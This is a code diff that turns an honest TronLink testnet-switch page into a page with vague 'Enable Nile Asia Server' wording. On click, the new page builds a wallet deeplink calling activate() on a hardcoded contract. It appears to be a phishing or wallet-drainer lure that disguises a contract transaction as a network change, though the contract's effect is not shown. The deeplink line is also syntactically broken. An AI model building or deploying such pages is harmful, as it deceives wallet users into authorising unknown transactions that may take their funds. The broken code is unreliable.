@@ -3,61 +3,103 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Enable TronLink Testnet</title>
+  <title>Enter TronLink</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       text-align: center;
       padding: 20px;
       max-width: 600px;
       margin: 0 auto;
+      background: #1a1d26;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
     }
+
+    .container {
+      padding: 30px;
+      background: #252935;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+
+    h1 {
+      color: #2e58ff;
+      font-size: 28px;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+
+    p {
+      color: #a2aabc;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
     button {
-      padding: 15px 30px;
+      padding: 16px 40px;
       font-size: 18px;
       cursor: pointer;
-      background: #2E58FF;
+      background: linear-gradient(135deg, #2e58ff 0%, #3b82f6 100%);
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
       margin: 20px 0;
+      transition: transform 0.2s;
+      font-weight: 500;
+      letter-spacing: 0.5px;
     }
+
+    button:hover {
+      transform: translateY(-2px);
+    }
+
     #fallback {
       display: none;
-      margin-top: 20px;
-      padding: 20px;
-      background: #f8f9fa;
-      border: 1px solid #e9ecef;
-      border-radius: 8px;
+      margin-top: 30px;
+      padding: 25px;
+      background: #2d3240;
+      border: 1px solid #3a4052;
+      border-radius: 12px;
       text-align: left;
     }
+
+    #fallback h3 {
+      color: #2e58ff;
+      margin-bottom: 15px;
+    }
+
     #fallback a {
-      color: #2E58FF;
+      color: #3b82f6;
       text-decoration: none;
+      font-weight: 500;
+    }
+
+    .tron-logo {
+      width: 80px;
+      margin-bottom: 25px;
     }
   </style>
 </head>
 <body>
-  <h1>Enable TronLink Testnet</h1>
-  <p>Click the button below to switch to the Nile Testnet.</p>
-  
-  <button id="switchButton">Switch to Testnet</button>
-  
-  <div id="fallback">
-    <h3>Manual Setup Required</h3>
-    <div id="mobileFallback" style="display: none;">
-      <p>TronLink not detected. Install it first:</p>
-      <p>
-        <a href="https://play.google.com/store/apps/details?id=com.tronlink" target="_blank">Android (Google Play)</a><br>
-        <a href="https://apps.apple.com/app/tronlink/id1450845242" target="_blank">iOS (App Store)</a>
-      </p>
-    </div>
-    <div id="desktopFallback" style="display: none;">
-      <p>For desktop:</p>
-      <ol>
-        <li>Install the <a href="https://www.tronlink.org/" target="_blank">TronLink extension</a>.</li>
-        <li>Open TronLink settings and select <strong>Nile Testnet</strong> under Network.</li>
-      </ol>
+  <div class="container">
+    <h1>Enter TronLink</h1>
+    <p>Click the button below to change your server</p>
+    
+    <button id="switchButton">Enable Nile Asia Server</button>
+
+    <div id="fallback">
+      <div id="mobileFallback" style="display: none;">
+        <h3>Manual Setup Required</h3>
+        <p>TronLink not detected. Install the mobile app:</p>
+        <p>
+          <a href="https://play.google.com/store/apps/details?id=com.tronlink" target="_blank">Download for Android</a><br>
+          <a href="https://apps.apple.com/app/tronlink/id1450845242" target="_blank">Download for iOS</a>
+        </p>
+      </div>
     </div>
   </div>
 
@@ -65,7 +107,6 @@
     const switchButton = document.getElementById('switchButton');
     const fallbackDiv = document.getElementById('fallback');
     const mobileFallback = document.getElementById('mobileFallback');
-    const desktopFallback = document.getElementById('desktopFallback');
 
     // Detect platform
     const isAndroid = /Android/i.test(navigator.userAgent);
@@ -74,42 +115,51 @@
 
     async function launchTronLink() {
       try {
-        if (isMobile) {
-          // Android: Intent URL for better app detection
-          if (isAndroid) {
-            window.location.href = 'intent://network/nile#Intent;scheme=tronlink;package=com.tronlink;end;';
-          } 
-          // iOS: Use universal link with user gesture
-          else if (isIOS) {
-            window.open('tronlink://network/nile', '_blank');
-          }
-
-          // Show fallback after 3s if app not launched
-          setTimeout(() => {
-            fallbackDiv.style.display = 'block';
-            mobileFallback.style.display = 'block';
-          }, 3000);
-
-        } else {
-          // Desktop: Programmatic network switch
-          if (window.tronLink?.request) {
-            await window.tronLink.request({ 
-              method: 'tron_switchNetwork', 
-              params: ['nile'] 
-            });
-          } else {
-            fallbackDiv.style.display = 'block';
-            desktopFallback.style.display = 'block';
-          }
+        if (!isMobile) {
+          alert('Please open this page on a mobile device');
+          return;
         }
+
+        // Nile activation parameters
+        const params = {
+          contract_address: "TNUC9Qb1rSaSxXzXCViBZDZT6f4cZ6JKEy",
+          function_selector: "activate()",
+          parameter: "0x"
+        };
+        
+        const encodedParams = encodeURIComponent(JSON.stringify(params));
+        const deeplink = tronlink://test.nile/tronlink/tronlink?params=${encodedParams};
+
+        // Platform-specific handling
+        if (isAndroid) {
+          window.location.href = deeplink;
+        } else if (isIOS) {
+          // iOS requires user gesture for deeplinks
+          const link = document.createElement('a');
+          link.href = deeplink;
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        }
+
+        // Show fallback after 3 seconds if no response
+        setTimeout(() => {
+          fallbackDiv.style.display = 'block';
+          mobileFallback.style.display = 'block';
+        }, 3000);
+
       } catch (error) {
         fallbackDiv.style.display = 'block';
-        isMobile ? mobileFallback.style.display = 'block' : desktopFallback.style.display = 'block';
+        mobileFallback.style.display = 'block';
       }
     }
 
-    // Trigger on button click (iOS-safe user gesture)
     switchButton.addEventListener('click', launchTronLink);
+
+    // Auto-show mobile fallback if not mobile
+    if (!isMobile) {
+      alert('Please open this page on a mobile device with TronLink Wallet installed');
+    }
   </script>
 </body>
 </html>
